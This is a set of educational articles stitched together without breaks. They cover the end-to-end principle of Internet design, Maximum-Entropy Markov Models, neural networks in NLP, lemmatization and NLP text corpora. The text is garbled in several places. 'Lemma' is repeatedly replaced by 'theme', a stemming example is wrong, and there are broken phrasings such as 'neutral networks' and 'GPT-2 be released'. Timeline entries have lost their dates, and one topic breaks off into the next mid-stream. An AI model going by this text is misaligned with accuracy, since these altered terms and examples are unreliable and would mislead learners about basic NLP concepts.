This implies that end computers still have to do the final checks even if the network has already done them .
This is the essence of the end - to - end ( E2E ) argument .
A communication system may do some things for performance reasons , but it ca n't achieve correctness .
For reasons of efficiency and performance , the communication system may implement some features at minimal cost but should avoid trying to achieve high levels of reliability .
Reliability and correctness must be left to end systems .
In addition , applications may not need features implemented in the communication system .
An " open " system would give more control to end systems .
How has the end - to - end principle benefited the Internet ?
Hourglass shape of Internet architecture .
Source : Mehani 2010 .
Complexity impedes scaling due to higher OPEX and CAPEX .
Thus , the end - to - end principle leads to the simplicity principle .
The IP layer is simple , giving the Internet its hourglass - shaped architecture .
At the network layer we have IP as the dominant protocol .
At higher layers , we have many protocols for supporting diverse applications .
At the lower layers , we have many protocols suited to different physical networks .
IP can be said to " hide the detailed differences among these various technologies , and present a uniform service interface to the applications above " .
IP itself is simple and general .
It 's supported by all routers within the network .
Application - level functions are kept at endpoints .
Application developers could therefore innovate without any special support from the network , with some calling it the generative Internet .
This principle has been credited with making the Internet a success .
Research has also shown that future architectures for the Internet are likely to evolve into the hourglass shape .
Does the end - to - end principle prohibit the network from maintaining its status ?
End - to - end applications can survive partial network failures .
This is because the network maintains only coarse - grained states , while endpoints maintain the main states .
The state can be destroyed only when the endpoint itself is destroyed , called fate sharing .
The fate of endpoints does n't depend on the network .
Routing , QoS guarantees , and header compression are some examples where the network may maintain state .
However , this state is self - healing .
It can be worked out even if network topology or activity changes .
State maintained within the network must be minimal .
Loss of this state should at most result in temporary loss of service .
The state maintained in the network may be called soft state , while that maintained at endpoints , and required for the proper functioning of the endpoints , may be called hard state .
Besides the Internet , where else has the end - to - end principle been applied ?
On the Internet , end - to - end principles have been applied to reliable delivery , deduplication , in - order delivery , reputation maintenance , security , and fault tolerance .
For security , both authenticity and encryption of messages are best done at endpoints .
Doing this within the network will not only compromise security but also complicate key management .
Its application to file transfer is well known .
Checksum should be validated only after successful storage to disk .
Another example is the EtherType field in an Ethernet frame .
Ethernet does n't interpret this field .
To do so would mean that all higher layer protocols would pay the price for the special few .
In computer architecture , RISC favours simple instructions over the complex ones of CISC .
In CISC , a designer may include complex instructions , but it 's hard for her to anticipate client requirements .
Clients may end up with their own specific implementations .
A case has been made to apply the end - to - end principle for data commons , that is , sharing and organizing data for a discipline .
Applications can decide how to import , export or analyze data .
The core system would only define global identifiers , basic metadata , authenticated access and a configurable data model .
What are the essential aspects of end - to - end connectivity ?
RFC 2775 ( published in 2000 ) mentions three aspects : E2E Argument : This is as described by Saltzer et al .
in 1981 , and what is now called the end - to - end principle .
E2E Performance : This concerns both the network and the end systems .
Research in this area has suggested some improvements to TCP , plus optimized queuing and discard mechanisms in routers .
However , this wo n't help other transport protocols that do n't behave like TCP in response to congestion .
E2E Address Transparency : A single logical address space was deemed adequate for the early Internet of the 1970s .
Packets could flow end to end unaltered and without change of source or destination addresses .
RFC 2101 of 1997 analyzed this aspect and concluded that address transparency is no longer maintained on the present day Internet .
An example of this is Network Address Translation ( NAT ) .
Applications that assume address transparency are likely to fail unpredictably .
Are there instances where the end - to - end principle has been violated ?
Violating the end - to - end principle could lead to problems .
Source : Kamniski 2019 .
Consider a client - server architecture involving a database writing operation at the server .
A " smart " server can return an immediate confirmation to the client even though it has n't completed the database writing operation .
If the writing fails , the server has to do retries , effectively taking up responsibilities of the client .
It gets worse if the server itself fails , since the client thinks that the database writing actually happened .
Bufferbloat was an interesting problem the Internet had in the late 2010s .
Because routers could afford larger buffers , they started accepting higher loads .
They did n't drop packets until later when their larger buffers started filling up .
Therefore , endpoints did n't backoff early enough .
This resulted in a slower internet .
HTTP caching , link - level encryption , SOAP 2.0 , Network Address Translation ( NAT ) and firewalls are other counter - examples .
Examples where the network gets involved are traffic management , capacity reservation , packet segmentation / reassembly , and multicast routing .
But this should n't be seen as violating the principle .
Likewise , cloud computing does n't violate the principle .
Cloud infrastructure is not part of the communication system .
It 's actually an endpoint .
How is the end - to - end principle relevant to the net neutrality debate ?
Net neutrality is about creating a level - playing field for everyone , big or small .
It ensures that big companies ca n't pay for preferential treatment of their content .
The network sees and treats all content alike .
Without net neutrality , a few companies that own or control online platforms or communication infrastructure become all too powerful .
Power therefore moves from the end consumers to the network controlled by a few .
This goes against the end - to - end principle .
Tim Wu coined the term " network neutrality " back in 2002 , when he noticed that broadband providers were blocking certain types of services .
Network providers might promise services such as blocking spam , viruses or even advertisements .
Most users would rather do these on their end systems rather than lose control .
Deep Packet Inspection ( DPI ) is used for QoS , security and even surveillance .
It 's at odds with net neutrality .
With DPI , intermediate nodes look into packet headers and payload .
Yet , the end - to - end principle does n't actually prohibit this .
What are the common criticisms of the end - to - end principle ?
One criticism is that the original paper by Saltzer et al .
never properly understood the true nature of packet switching , which is stochastic .
The paper also confused moving packets through the network ( statistical ) with non - functional aspects such as confidentiality ( computational ) .
It would have been better to model the timely arrival of packets to enable successful computation .
The end - to - end principle never gave end users freedom .
Network infrastructure has always been built and controlled for commercial reasons by those who have the means .
Therefore , to protect user interests , discussions must involve everyone in the industry .
Back in 2001 , researchers noted new applications and scenarios that end - to - end principle did n't address very well : untrusted endpoints , video streaming , ISP service differentiation , third - parties , and difficulty in configuring home network devices .
All of these could benefit with some intelligence in the network .
In Service - Oriented Architecture ( SOA ) , implementing stuff end - to - end would be too costly .
A hop - by - hop approach would be better .
Ultimately , the principle should n't be applied blindly .
In the early days of the Internet , when bandwidth was scarce , HTTP caching made sense even when it violated the end - to - end principle , even when it made HTTP a considerably more complex protocol .
In the 1950s , for reading and writing files on magnetic tapes , engineers attempted to design a reliable tape subsystem .
They failed to create such a system .
Ultimately , applications take care of checks and recovery .
An example of this from the 1970s is the Multics file system .
Although there 's low - level error detection and correction , they do n't replace high - level checks .
Frenchman Louis Pouzin designs and develops CYCLADES , a packet switching network .
It became the first network in which hosts were responsible for reliable delivery of packets .
Networks transport datagrams without delivery guarantees .
Even the term datagram is coined by Pouzin .
CYCLADES inspires the first version of TCP .
Meanwhile , D.K. Branstad makes the end - to - end argument with reference to encryption .
What was originally TCP , is split into two parts : TCP and IP .
Thus , layered architecture is applied and the functions of each layer become more well defined .
On January 1st , 1983 , TCP / IP became the standard protocol for ARPAnet that by now connects 500 sites .
J.H. Saltzer , D.P. Reed and D.D. Clark at the MIT Laboratory for Computer Science presented a conference paper titled End - to - end Arguments in System Design .
Given a distributed system , the paper gives guidance on where to place protocol functions .
For example , end systems should perform recovery , encryption and deduplication .
Low - level parts of the network could support them only as performance enhancements .
Phil Karn , a well - known Internet contributor , comments years later that this is " the most important network paper ever written " .
The IETF publishes RFC 1958 titled Architectural Principles of the Internet , with reference to the end - to - end principle of Saltzer et al .
In 2002 , this RFC was updated by RFC 3439 .
Other IETF documents relevant to this discussion are RFC 2775 ( 2000 ) , and RFC 3724 ( 2004 ) .
David S. Isenberg , an employee of AT&T , writes an essay titled The Rise of the Stupid Network .
He notes that telephone networks were built on the assumption of scarce bandwidth , circuit - switching , and voice - dominated calls .
This has led to the creation of the Intelligent Network ( IN ) , where the network took on more features .
Given the rise of the Internet , Isenberg argues that the time has come for telephone networks to become stupid and allow endpoints to do intelligent things .
Tell networks , " Deliver the Bits , Stupid " .
There are many systems where there 's a time or state dependency .
These systems evolve in time through a sequence of states and the current state is influenced by past states .
For example , there 's a high chance of rain today if it had rained yesterday .
Other examples include stock prices , DNA sequencing , human speech or words in a sentence .
One problem is that we may have observations but not the states .
For example , we know the sequence of words but not the corresponding part - of - speech tags .
We therefore model the tags as states and use the observed words to predict the most probable sequence of tags .
This is exactly what the Maximum - Entropy Markov Model ( MEMM ) can do .
MEMM is a model that makes use of state - time dependencies .
It uses predictions of the past and current observation to make current predictions .
Which are the building blocks of the Maximum - Entropy Markov Model ?
Let 's consider the task of email spam detection .
Using logistic regression , we can obtain the probability that an email is spam .
It 's essentially a binary classification .
We can extend this to a multiclass problem .
For example , in image analysis , we 're required to classify the object into one of many classes .
We estimate the probability for each class .
Rather than take a hard decision on one of the outcomes , it 's better to output probabilities , which will benefit downstream tasks .
Multinomial logistic regression is also called softmax regression or Maximum Entropy ( MaxEnt ) classifier .
Entropy is related to " disorder " .
The higher the disorder , the less predictable the outcomes , and hence the more information .
For example , an unbiased coin has more information ( and entropy ) than a coin that mostly lands up heads .
MaxEnt is therefore about picking a probability distribution that maximizes entropy .
Then , there 's Markov Chain .
It models a system as a set of states with probabilities assigned to state transitions .
While MaxEnt computes probabilities for each input independently , the Markov chain recognizes that there 's dependency from one state to the next .
Thus , MEMM is about maximizing entropy plus using state dependencies ( Markov Model ) .
Could you explain MEMM with an example ?
An Example of POS tagging with MEMM .
Source : Gui et al .
2019 , slide 46 .
Consider the problem of POS tagging .
Given a sequence of words , we wish to find the most probable sequence of tags .
MEMM predicts the tag sequence by modelling tags as states of the Markov chain .
To predict a tag , MEMM uses the current word and the tag assigned to the previous word .
In reality , MEMM does n't make a hard decision on what tag to select .
Using MaxEnt , it calculates the probability of each tag .
Probabilities of past tags are used to make a soft decision so that the word sequence as a whole gets the best possible tag sequence .
The algorithm that can do this efficiently is the Viterbi algorithm .
The formula in the figure assumes a sequence of L words .
Z is a normalized term , so that probabilities are in the range [ 0 , 1 ] and they all add up to 1 .
What are some applications where MEMM is used ?
Use of MEMM for facial expression recognition .
Source : Siddiqi et al .
2016 , fig .
1 .
MEMM has been used in many NLP tasks , including POS tagging and semantic role modelling .
It 's been used in computational biology for protein secondary structure prediction .
One study used MEMM for recognizing human facial expressions .
Human expressions are modelled on states .
Observations are from video sensors .
How is MEMM different from Hidden Markov Model ( HMM ) ?
HMM vs. MEMM for POS tagging .
Source : Adapted from Jurafsky and Martin 2009 , fig .
6.20 .
HMM is a generative model because words as modelled as observations generated from hidden states .
Even the formulation of probabilities uses likelihood P(W|T ) and prior P(T ) .
On the other hand , MEMM is a discriminative model .
This is because it directly uses posterior probability P(T|W ) ; that is , the probability of a tag sequence given a word sequence .
Thus , it discriminates among the possible tag sequences .
It can also be said that HMM uses joint probability to maximize the probability of the word sequence .
MEMM uses conditional probability , conditioned on previous tag and current word .
In HMM , for the tag sequence decoding problem , probabilities are obtained by training on a text corpus .
In MEMM , we build a distribution by adding features which can be hand crafted or picked out by training .
The idea is to select the maximum entropy distribution given the constraints specified by the features .
MEMM is more flexible because we can add features such as capitalization , hyphens or word endings , which are hard to consider in HMM .
MEMM allows for diverse non - independent features .
What are some shortcomings of MEMM ?
Illustrating the label bias problem .
Source : Lafferty et al .
2001 , fig .
1 .
MEMM suffers from what 's called the label bias problem .
Once we 're in a state or label , the next observation will select one of many transitions leaving that state .
However , the model as a whole would have many more transitions .
If a state has only one outgoing transition , the observation has no influence .
Simply put , transition scores are normalized on a per - state basis .
Consider a character - level input sequence " rib " .
We have an MEMM to select between " rib " and " rob " .
When we receive ' r ' , both paths 0 - 1 and 0 - 4 get equal probability mass .
When ' i ' arrives , we have nowhere to go from state-4 except to state-5 and pass on the entire probability mass along this path .
When ' b ' arrives , at state-3 , both paths are equally likely .
The label bias problem was first noted by L. Bottou in 1991 .
Conditional Random Fields ( CRFs ) is an alternative model that solves this .
Berger et al .
at the IBM Watson Research Center note that the concept of maximum entropy is not new but is not common in real - world applications due to high computational requirements .
This is changing due to more powerful computers .
They apply MaxEnt to some NLP tasks such as sentence segmentation and word reordering .
They show that MaxEnt and maximum likelihood give the same result . The model with the greatest entropy consistent with the constraints is the same as the exponential model which best predicts the sample of data .
Adwait Ratnaparkhi at the University of Pennsylvania applies MaxEnt model along with a Markov model to the task of part - of - speech tagging .
He simply calls it the Maximum Entropy Model .
The model is able to use rich contextual features .
It achieves state - of - the - art accuracy of 96.6 % .
This work led to his PhD in 1998 .
The model considers the past two POS tags , and the features of the past two and next two words .
It combines them into a single exponential model .
Saul and Rahim make use of Markov Processes on Curves ( MPCs ) for automatic speech recognition .
The Acoustic feature trajectory is a continuous variable that evolves jointly with phonetic transcriptions modelled as discrete states .
This work later inspires MEMM by McCallum et al .
who apply it to discrete time .
Line - based features are used to classify text .
Source : McCallum et al .
2000 , table 3 .
McCallum et al .
coin the term Maximum - Entropy Markov Model ( MEMM ) .
They apply it to information extraction and segmentation .
They note that the three well - known problems solved by HMM can also be solved by MEMM .
Exponential models of MEMM can be trained using Generalized Iterative Scaling ( GIS ) , which is similar to the Expectation - Maximization ( EM ) algorithm used in HMM .
Lafferty et al .
propose an alternative discriminative model called Conditional Random Fields ( CRFs ) to overcome the label bias problem of MEMM .
MEMM can be biased towards states with fewer successor states .
While MEMM uses per - state exponential models for the conditional probabilities , CRF uses a single exponential model for the joint probability of the entire label sequence given the observation sequence .
In other words , CRF uses global normalization instead of per - state normalization .
However , CRF is slower to train than MEMM .
State - of - the - art NN for NLP in 2018 .
Source : Devlin and Chang 2018 .
The use of statistics in NLP started in the 1980s and heralded the birth of what we called Statistical NLP or Computational Linguistics .
Since then , many machine learning techniques have been applied to NLP .
These include naïve Bayes , k - nearest neighbours , hidden Markov models , conditional random fields , decision trees , random forests , and support vector machines .
The use of neutral networks for NLP did not start until the early 2000s .
But by the end of 2010 , neural networks transformed NLP , enhancing or even replacing earlier techniques .
This has been made possible because we now have more data to train neural network models and more powerful computing systems to do so .
In traditional NLP , features are often hand - crafted , incomplete , and time - consuming to create .
Neural networks can learn multilevel features automatically .
They also give better results .
Which are the main innovations in the application of NN to NLP ?
Two main innovations have enabled the use of neural networks in NLP : Word Embeddings : This enables us to represent words as real - valued vectors .
Instead of having a sparse representation , word embeddings allowed us to represent words in a much smaller dimensional space .
We could identify similar words due to their closeness in this vector space , or use analogies to exploit semantic relationships between words .
NN Architectures : These have evolved in other domains , such as computer vision and were adapted to NLP .
This started in language modelling , and later applied to morphology , POS tagging , coreference resolution , parsing , and semantics .
From these core areas , neural networks were applied to applications : sentiment analysis , speech recognition , information retrieval / extraction , text classification / generation , summarization , question answering , and machine translation .
These architectures are usually not as deep ( many hidden layers ) as found in computer vision .
Which are the NN architectures that have been used for NLP ?
Example of 2-layer BiLSTM - based ELMo .
Source : Horan 2019 .
Early language models used feedforward NN or convolutional NN architectures , but these did n't capture context very well .
Context is how one word occurs in relation to surrounding words in the sentence .
To capture context , recurrent NNs were applied .
LSTM , a variant of RNN , was then used to capture long - distance context .
Bidirectional LSTM ( BiLSTM ) improves upon LSTM by looking at word sequences in forward and backward directions .
Typically , the dimensionality of input and output must be known and fixed .
This is problematic for machine translation .
For example , the best translation of a 10-word English sentence might be a 12-word French sentence .
This problem is solved by a sequence - to - sequence model that 's based on encoder - decoder architecture .
The essence of the encoder is to encode an entire input sequence into a large fixed - dimensional vector , called the context vector .
The decoder implements a language model conditioned on the input sequence .
To encode contextual information in a single context vector is difficult .
This gave rise to the idea of attention where more information is given to the decoder .
From here , the transformer model evolved .
What 's been the general trend in NLP research with neural networks ?
Language modelling has been essential for the progress of the NLP .
Because of the ready availability of text , it 's been easy to train complex models in an unsupervised manner on lots of training data .
The intent is to train the model to learn about words and the contexts in which they occur .
For example , the model should learn a vector representation of " bank " and also discriminate between a river bank and a financial institution .
A pretrained language model , first proposed in 2015 , can save us expensive training on vast amounts of data .
However , such a pretrained model may need some amount of training on domain - specific data .
Then the model can be applied to many downstream NLP tasks .
This approach is similar to pretrained word embeddings that did n't capture context .
The use of a pretrained language model in another downstream task is called transfer learning , a concept that 's also common in computer vision .
It 's expected that transformer models will dominate RNN .
Pretrained models will get better .
It 'll be easier to fine tune models .
Transfer learning will become more important .
Could you share some real - world examples of NN in NLP ?
NN model for Gmail 's Smart Compose .
Source : Wu 2018 .
In 2018 , Google introduced Smart Compose in Gmail .
A seq2seq model using email subject and previous email body gave good results but failed to meet latency constraints .
They finally settled on a hybrid of bag - of - words ( BoW ) and RNN - LM .
Average embeddings are fed to RNN - LM .
At Amazon , they 've used a lightweight version of ELMo to augment Alexa functions .
While ELMo uses a stack of BiLSTM , they use a single layer since Alexa transactions are linguistically more uniform .
They trained the embeddings in an unsupervised manner , and then trained on two tasks ( intent classification and slot tagging ) in a supervised manner while only slowly adjusting the embeddings .
They also transfer learning to new tasks .
Uber has used NLP to filter tickets related to map data .
Using word2vec , they trained word embeddings on one million tickets .
This had the limitation that all words are treated equally .
They then experimented with WordCNN and LSTM networks .
They got the best results with word2vec trained on customer tickets and used it with WordCNN .
For future work , they suggested character - level ( CharCNN ) embeddings that are more resilient to typos .
Neural network with word vector C(i ) for ith word .
Source : Bengio et al .
2003 , fig .
1 .
Bengio et al .
point out the curse of dimensionality where the large vocabulary size of natural languages makes computations difficult .
They propose a feedforward neural network that jointly learns the language model and vector representations of words .
They refine their methods in a follow - up paper from 2003 .
Words to features to word vectors via lookup tables .
Source : Collobert and Weston 2008 , fig .
1 .
Collobert and Weston train a language model in an unsupervised manner from Wikipedia data .
They use supervised training for both syntactic tasks ( POS tagging , chunking , parsing ) and semantic tasks ( named entity recognition , semantic role labelling , word sense disambiguation ) .
To model long - distance dependencies , they use a Time - Delay Neural Network ( TNN ) inspired by CNN .
They use multiple layers to move from local features to global features .
Moreover , two models can share word embeddings , an approach called multitask learning .
Mikolov et al .
use a recurrent neural network ( RNN ) for language modelling and apply this for speech recognition .
They show better results than traditional n - gram models .
Dahl et al .
combines deep neural network with the hidden Markov model ( HMM ) for large vocabulary speech recognition .
Recursive NN ( for sentiment analysis ) exploits the hierarchical structure of language .
Source : Socher et al .
2013 , fig .
1 .
Going beyond just word embeddings , Kalchbrenner and Blunsom map an entire input sentence to a vector .
They use this for machine translation without relying on alignments or phrasal translation units .
In other research , LSTM is found to capture long - range context and is therefore suitable for generating sequences .
In general , 2013 is the year when there 's research focused on using CNN , RNN / LSTM and recursive NN for NLP .
Using CNN for NLP tasks .
Source : Kim 2014 , fig .
1 .
Using pretrained word2vec embeddings , Yoon Kim uses CNN for sentence classification .
Also in 2014 , Sutskever et al .
Google applies a sequence - to - sequence model to the task of machine translation .
They use separate 4-layered LSTMs for encoder and decoder .
Reversing the order of source sentences allows LSTM to exploit short - term dependencies and therefore do well on long sentences .
Seq2seq models are suited for NLG tasks such as captioning images or describing source code changes .
Encoder - decoder model with attention .
Source : Weng 2018 , fig .
4 .
Bahdanau et al .
apply the concept of attention to the seq2seq model used in machine translation .
This helps the decoder to " pay attention " to important parts of the source sentence .
It does n't force the encoder to pack all information into a single context vector .
Effectively , the model does a soft alignment of input to output words .
Dai and Le propose a two - step procedure of unsupervised pre - training followed by supervised training for text classification .
This semi - supervised approach works well .
Pre - training helps to initialize the model for supervised training and generalization .
More unlabelled data during pre - training is seen to improve supervised learning .
In later years , this approach becomes important .
Google 's model for NMT .
Source : Wu et al .
2016 , fig .
1 .
Google replaced its phrase - based translation system with Neural Machine Translation ( NMT ) .
This reduces translation errors by 60 % .
It uses a deep LSTM network with 8 encoders and 8 decoder layers .
The first layer of the encoder is BiLSTM .
The model also uses residual connections among the LSTM layers .
Use of convolution and attention in seq2seq modelling .
Source : Gehring et al .
2017 , fig .
1 .
Recurrent architectures ca n't be parallelized due to their sequential nature .
Gehring et al .
Therefore , I propose using CNNs for seq2seq modelling since CNNs can be parallelized and make best use of GPU hardware .
The model uses gated linear units , residual connection and attention in each decoder layer .
Encoder self - attention distribution for the word ' it ' in different contexts .
Source : Uszkoreit 2017 .
Vaswani et al .
propose a transformer model in which they use a seq2seq model without using RNN .
The transformer model relies only on self - attention .
By 2018 , the transformer will lead to state - of - the - art models such as OpenAI GPT and BERT .
Researchers at the Allen Institute for Artificial Intelligence introduced ELMo ( Embeddings from Language Models ) .
While earlier work derived contextualized word vectors , this was limited to the top LSTM layer .
ELMo 's word representations use all layers of a bidirectional language model .
This allows ELMo to model syntax , semantics and polysemy .
Such a language model can be pretrained on a large scale and then used for a number of downstream tasks .
OpenAI GPT-2 shows its power in natural language generation .
Trained on 8 million websites , it has 1.5 billion parameters .
The model was initially not released to the public due to concerns of misuse ( such as fake news generation ) .
However , in November 2019 , GPT-2 be released .
Lemmatization involves morphological analysis .
Source : Bitext 2018 .
Consider the words ' am ' , ' are ' , and ' is ' .
These come from the same root word ' be ' .
Likewise , ' dinner ' and ' dinners ' can be reduced to ' dinner ' .
Variations of a word are called wordforms or surface forms .
It 's often complex to handle all such variations in software .
By reducing these wordforms to a common root , we simplify the input .
The root form is called lemma .
An algorithm or program that determines lemmas from wordforms is called a lemmatizer .
For example , the Oxford English Dictionary of 1989 has about 615 K lemmas as an upper bound .
Shakespeare 's works have about 880 K words , 29 K wordforms , and 18 K lemmas .
Lemmatization involves word morphology , which is the study of word forms .
Typically , we identify the morphological tags of a word before selecting the theme .
Why do we need to find the theme of a word ?
Part of the speech helps in identifying the correct theme .
Source : McCloud 2019 .
Many NLP tasks can benefit from lemmatization .
For instance , topic modelling looks at word distribution in a document .
By normalizing words to a common form , we get better results .
In word embedding , that is , representing words as real - valued vectors , removing inflected wordforms can improve downstream NLP tasks .
For information retrieval ( IR ) , lemmatization helps with query expansion so that suitable matches are returned even if there 's not an exact word match .
In document clustering , it 's useful to reduce the number of tokens .
It also helps with machine translation .
Ultimately , the decision to use lemmas is application dependent .
We should use lemmas only if they show better performance .
What are the challenges with lemmatization ?
Lemma ambiguity is high for Arabic and Urdu .
Source : Bergmanis and Goldwater 2018 , fig .
3 .
Out - of - vocabulary ( OOV ) words is a challenge .
For example , WordNet that 's used by NLTK package for lemmatization , does n't have the word ' carmaking ' .
The lemmatizer therefore does n't relate this to ' carmaker ' .
It is difficult to construct rules for irregular word inflections .
The word ' bring ' might look like an inflected form of ' to bre ' , but it 's not .
Even more challenging is a word such as ' gehört ' in German .
It 's a participle of ' hören ' ( to hear ) or of ' gehören ' ( to belong ) .
Both are valid , but only the context of usage can help us derive the correct theme .
It 's for these reasons that neural network approaches to learning rules are preferred over hand - crafted rules .
When content comes from the Internet or social media , it 's impractical to use a predefined dictionary .
This is another reason for a neural network approach with an open vocabulary .
Even with neural networks , some inflected forms might never occur in training , such as , ' forbade ' , the past tense of ' forbid ' .
Many training corpora come from newspaper texts where verbs in second person are rare .
This can impact lemmatization of such forms .
How is lemmatization different from stemming ?
Stemming versus lemmatization .
Source : Kushwah 2019 .
Given a wordform , stemming is a simpler way to get to its root form .
Stemming simply removes prefixes and suffixes .
Lemmatization , on the other hand , uses morphological analysis , uses dictionaries and often requires part of speech information .
Thus , lemmatization is a more complex process .
Stems need not be dictionary words but lemmas always are .
Another way to say this is that " a lemma is the base form of all its inflectional forms , whereas a stem is n't " .
Wordforms are either inflectional ( change of tense , singular / plural ) or derivational ( change of part of speech or meaning ) .
Lemmatization usually collapses inflectional forms whereas stemming does this for derivational forms .
Stemming may suffice for many use cases in English .
For morphologically complex languages such as Arabic , lemmatization is essential .
There are two types of problems with stemming that lemmatization can solve : Two wordforms with different lemmas may stem to the same result .
Eg .
' universal ' and ' university ' result in the same stem ' university ' .
Two wordforms of the same lemma may end as two different stems .
Eg .
' good ' and ' better ' have the same theme ' good ' .
Which are the available models for lemmatization ?
Derivational rules are used by an FST lemmatizer .
Source : Matuszek and Papalaskari 2015 , slide 23 .
The classical approach is to use a Finite State Transducer ( FST ) .
FST models encode vocabulary and string rewrite rules .
Where there are multiple encoding rules , there 's ambiguity .
We can think of FST as reading the surface form from an input tape and writing the lexical form on an output tape .
There could be intermediate tapes for spelling changes , etc .
One well - known tool is Helsinki Finite State Toolkit ( HFST ) that makes use of other open source tools such as SFST and OpenFST .
Chrupała formalized lemmatization in 2006 by treating it as a string - to - string transduction task .
Given a word w , we get its morphological attributes m. To obtain the lemma l , we calculate the probability of P(l|w , m ) .
This uses features based on ( l , w , m ) .
It then trains a Maximum - Entropy Markov Model ( MEMM ) , one each for POS tags and lemmas .
Müller improved on this by using Conditional Random Fields ( CRFs ) for jointly learning tags and lemmas .
One researcher combined the best of stemming and lemmatization .
Which are the neural network approaches to lemmatization ?
Seq2seq model for lemmatization .
Source : Fonseca 2019 .
A well - known model is the Sequence - to - Sequence ( seq2seq ) neural network .
Words and their lemmas are processed character by character .
Input can include POS tags .
Every input is represented using word embeddings .
To deal with lemma ambiguity , we need to make use of the context .
Bidirectional LSTM networks , that are based on RNNs , are able to do this .
They take in a sequence of words to produce context - sensitive vectors .
Then the lemmatizer uses automatically generated rules ( pretrained by another neural network ) to arrive at the lemma .
However , such ambiguity is so rare that seq2seq architecture may be more efficient .
Encoder - decoder architecture using GRU is another approach to handling unseen or ambiguous words .
Turku NLP , based on NN , provides one of the state - of - the - art lemmatizers .
Other good ones are UDPipe Future and Stanford NLP , although the latter performs poorly for low - resource languages , for which CUNI x - ling excels .
Could you mention some tools that can do lemmatization ?
MorphAdorner is an online lemmatizer .
Source : NUIT 2019 .
In Python , NLTK has ` WordNetLemmatizer ` class to determine lemmas .
It includes the option to pass the part of speech to help us obtain the correct lemmas .
Other Python - based lemmatizers are in packages spaCy , TextBlob , Pattern and GenSim .
Stanford 's LemmaProcessor is another Python - based lemmatizer .
It allows us to select a seq2seq model , a dictionary model or a trivial identity model .
For Chinese , a dictionary model is adequate .
In Vietnamese , lemma is identical to the original word .
Hence , identity model will suffice .
TreeTagger does POS tagging plus gives lemma information .
It supports 20 natural languages .
Another multilingual framework is GATE DictLemmatizer , which is based on HFST and word - lemma dictionaries available from Wiktionary .
We can use wiktextract to download and process Wiktionary data dumps .
LemmaGen is an open - source multilingual platform with implementations or bindings in C++ , C # and Python .
On .NET , there 's LemmaGenerator .
There 's a Java implementation of Morpha .
It 's in the 1960s that morphological analysis was formalized .
Chomsky and Halle show that an ordered sequence of rewritten rules converts abstract phonological forms to surface forms through intermediate representations .
Douglas C. Johnson shows that pairs of input / output can be modelled by finite state transducers .
However , this result was overlooked and rediscovered later in 1981 by Ronald M. Kaplan and Martin Kay .
Thus far , rules have been applied in a cascade .
Kimmo Koskenniemi invents two - level morphology , where rules can be applied in parallel .
Rules are seen as symbol - by - symbol constraints .
Lexical lookup and morphological analysis are done in tandem .
It 's only in 1985 that the first two - level rules compiler was invented .
Karttunen et al .
show how we can compile regular expressions to create finite state transducers .
The use of finite state transducers for morphological analysis and generation is well known , but its application in other areas of NLP is not well known .
The authors show how to use them for date parsing , date validation and tokenization .
In a problem related to lemmatization , Minnen et al .
at the University of Sussex show how to generate words in English based on lemma , POS tag and inflection form to be generated .
They write high - level descriptions or rules as regular expressions , which Flex compiles into finite - state automata .
Edit tree used for lemmatization .
Source : Müller et al .
2015 , fig .
1 .
Grzegorz Chrupała publishes simple data - driven context - sensitive lemmatization .
Lemmatization is modelled as a classification problem where the algorithm chooses one of many " edit trees " that can transform a word to its lemma .
Such trees are induced by wordform - lemma pairs .
This work led to a PhD dissertation in 2008 and the system is named Morfette .
Second - order linear chain CRF to predict lemma .
Source : Müller et al .
2015 , fig .
2 .
Many NLP systems take a pipeline approach .
They do tagging followed by lemmatization , since POS tags can help the lemmatizer disambiguate .
But there 's a mutual dependency between tagging and lemmatization .
Müller et al .
present a system called Lemming that jointly does POS tagging and lemmatization using Conditional Random Fields ( CRFs ) .
It can also analyze OOV words .
This work sets a new baseline for lemmatization of six languages .
At the SIGMORPHON Shared Task , it 's noted that various neural sequence - to - sequence models give the best results .
In 2018 , a seq2seq model is used along with novel context representation .
This model , used within TurkuNLP in the CoNLL-18 Shared Task , gives the best performance on lemmatization .
Bergmanis and Goldwater use encoder - decoder NN architecture in a lemmatizer they name Lematus .
Both the encoder and decoder are 2-layer Gated Recurrent Unit ( GRU ) .
They compare its performance against context - free systems .
They use character contexts of each form to be lemmatized .
Thus , training resources needed are less .
They note that context - free systems may be adequate if a language has many unseen words but few ambiguous words .
Words , morphological tags and lemmas .
Source : Malaviya et al .
2019 , fig .
1 .
Malaviya et al .
use an NN model to jointly learn morphological tags and lemmas .
They use an encoder - decoder model with hard attention mechanism .
In particular , they use a 2-layer LSTM for morphological tagging .
For the lemmatizer , they use a 2-layer BiLSTM encoder and a 1-layer LSTM decoder .
They compare their results with other state - of - the - art models : Lematus , UDPipe , Lemming , and Morfette .
Datasets can help benchmark a model 's performance .
Source : Zhang and Wallace 2017 , table 2 .
In the domain of natural language processing ( NLP ) , statistical NLP in particular , there 's a need to train the model or algorithm with lots of data .
For this purpose , researchers have assembled many text corpora .
A common corpus is also useful for benchmarking models .
Typically , each text corpus is a collection of text sources .
There are dozens of such corpora for a variety of NLP tasks .
This article ignores speech corpora and considers only those in text form .
While English has many corpora , other natural languages too have their own corpora , though not as extensive as those for English .
Using modern techniques , it 's possible to apply NLP to low - resource languages , that is , languages with limited text corpora .
What are the traits of a good text corpus or wordlist ?
It 's said that a prototypical corpus must be machine - readable in Unicode .
It must be a representative sample of the language in current use , balanced , and collected in natural settings .
A good corpus or wordlist must have the following traits : Depth : A wordlist , for instance , should include the top 60 K words and not just the top 3 K words .
Recent : Corpus based on outdated texts is not going to suit today 's tasks .
Metadata : Metadata should indicate the sources , assumptions , limitations and what 's included in the corpus .
Genre : Unless corpus has been collected for specific tasks , it should include different genres such as newspapers , magazines , blogs , academic journals , etc .
Size : A corpus of half a million words or more ensures that low - frequency words are also adequately represented .
Clean : A wordlist giving word forms of the same word can be messy to process .
A better corpus would include only the theme and part of the speech .
What are the different types of text corpora for NLP ?
A plain text corpus is suitable for unsupervised training .
Machine learning models learn from the data in an unsupervised manner .
However , a corpus that has the raw text plus annotations can be used for supervised training .
It takes considerable effort to create an annotated corpus but it may produce better results .
A corpus can be assembled from a variety of sources and genres .
Such a corpus can be used for general NLP tasks .
On the other hand , a corpus might be from a single source , domain or genre .
Such a corpus can be used only for a specific purpose .
What are the types of annotations that we can have on a text corpus ?
American National Corpus Open annotated with POS , lemma and noun chunks , in XML and standalone form .
Source : Gries and Berez 2017 , fig .
6 .
Part - of - speech is one of the most common annotations because of its use in many downstream NLP tasks .
Annotating with lemmas ( base forms ) , syntactic parse trees ( phrase - structure or dependency tree representations ) and semantic information ( word sense disambiguation ) are also common .
